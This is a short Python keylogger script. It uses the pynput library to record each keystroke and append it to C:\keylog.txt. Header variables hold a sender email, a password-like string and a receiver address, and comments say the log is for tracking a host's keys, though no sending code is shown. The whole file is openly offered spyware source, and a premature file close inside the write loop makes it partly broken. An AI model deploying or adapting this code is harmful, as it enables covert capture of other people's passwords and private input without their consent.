#library


from pynput.keyboard import Key, Listener

keys_information = "keylog.txt"                     #filename where the information will be stored in notepad
email_address= "example1@gmail.com"                 #sender mail that is written in script and sends information in the form of .txt to receiver main
password = "asdscsadsadsbqcz"

toaddr = "receiverexmaple@gmail.com"                #receiver/user who wants to track the keyloggs of the host via receiver main

file_path = "C:\\"                                  #path of the notepad
extend = "\\"

count = 0
keys = []


# keylogg function



def on_press(key):                                  #tracks key
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):                               #stores the tracked key in notepad
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):                                #used to stop tracking the key once the key is not pressed anymore
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()



